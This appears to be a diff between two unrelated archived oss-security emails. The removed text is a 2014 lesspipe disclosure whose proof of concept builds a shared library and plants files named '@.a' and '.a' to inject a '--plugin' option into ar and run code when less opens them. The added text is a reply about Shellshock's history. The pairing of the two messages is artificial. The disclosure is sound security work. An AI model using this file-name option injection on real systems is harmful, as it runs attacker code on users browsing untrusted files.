@@ -1,56 +1,49 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/12/11/6
-Message-ID: <5488E08A.5000704@mccme.ru>
-Date: Thu, 11 Dec 2014 03:08:42 +0300
-From: Alexander Cherepanov <cherepan@...me.ru>
-To: oss-security@...ts.openwall.com
-Subject: Re: so, can we do something about lesspipe? (+ a cpio bug to back up the argument)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/04/5
+Message-ID: <20141004152249.6ba0a68d@hboeck.de>
+Date: Sat, 4 Oct 2014 15:22:49 +0200
+From: Hanno Böck <hanno@...eck.de>
+To: Riot <rain.backnet@...il.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Shellshock timeline (was: CVE-2014-6271: remote code execution through bash)
 Content-Type: text/plain; charset=utf-8
 
-On 2014-11-23 12:24, Michal Zalewski wrote:
-> In short, many Linux distributions ship with the 'less' command
-> automagically interfaced to 'lesspipe'-type scripts, usually invoked
-> via LESSOPEN. This is certainly the case for CentOS and Ubuntu.
+Am Sat, 4 Oct 2014 00:19:06 +0100
+schrieb Riot <rain.backnet@...il.com>:
+
+> We then worked further back in time, unearthing bash 1.08.2 on an
+> ancient 1991 Atari ST image:
+> http://images.rymate.co.uk/images/iwaSGPo.png  This was also
+> vulnerable.  This version is relevant because the first version of
+> bash ported to linux was bash 1.08 - here's the original post by
+> Linus at the tender age of  advertising his first build of linux on
+> the minix newsgroup in 1991, explicitly mentioning bash 1.08.  This
+> datum told us that shellshock is older than all of linux, which makes
+> for a nice soundbite for the press.
 >
-> Unfortunately, many of these scripts appear to call a rather large
-> number of third-party tools that likely have not been designed with
-> malicious inputs in mind. On CentOS, lesspipe appears to include
-> things such as groff + troff + grotty, man, and cpio. On Ubuntu,
-> there's isoinfo (?!), ar from binutils, and so on. Ancient and obscure
-> compression utilities and doc converters crop up, too.
+> Going back further proved very difficult because few archives
+> including these early versions exist anywhere, and by all accounts
+> the early releases were buggy and not particularly portable.  We
+> eventually managed to locate an image for an obscure Japanese
+> Human68k containing bash 1.05.  Here it identifies itself as bash
+> 1.05 X6_19: http://images.rymate.co.uk/images/kH8VnTo.png  The file
+> is dated 12/08/1991... and of course it's vulnerable:
+> http://images.rymate.co.uk/images/zTYm05I.png
 
-Yeah, it also leads to funny collisions in command line parsing.
 
-Let's consider `ar` again. If it meets an option starting with '@' it 
-treats the rest of the option as a file name to read additional options 
-from. This can be dangerous but the user is supposed to read help/man 
-and not to run command like `ar tv @file` or `readelf -x *` in an 
-untrusted directory (all utilities from binutils seems to have this 
-feature).
+Can you post the relevant download links to the atari st / 68k images
+and other possibly interesting stuff? Or where they from private
+archives?
 
-Then `less` enters the game. I don't see anything in --help/man for 
-`less` which hints that '@' is a dangerous char to be in file names. Ok, 
-let's see how it can be combined:
-
-----------------------------------------------------------------------
-
-# imagine that we work in an untrusted dir (unpacked archive or
-# something) and the dir contains the following files
-printf '#include <stdio.h>\nvoid onload(void *v) { puts("Pwned"); }' | \
-   gcc -fPIC -shared -o plugin.so -xc -
-ar rc ./@.a /dev/null
-echo '-s --plugin ./plugin.so ./@.a' > .a
-
-# pretend that our distro activated lesspipe and finally run `less`
-(eval "$(lesspipe)"; less @.a)
-
-----------------------------------------------------------------------
-
-You should see "Pwned" inside `less`.
-
-IMHO it crosses security boundary and should be considered a vuln in 
-lesspipe. It neither validates file names nor documents the dangerous 
-ones. It also perfectly illustrate how fragile this construction is.
+I think independently of current events this might be interesting for
+people digging in IT history, so having them somewhere easy to find
+would be nice.
 
 -- 
-Alexander Cherepanov
+Hanno Böck
+http://hboeck.de/
+
+mail/jabber: hanno@...eck.de
+GPG: BBB51E42
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
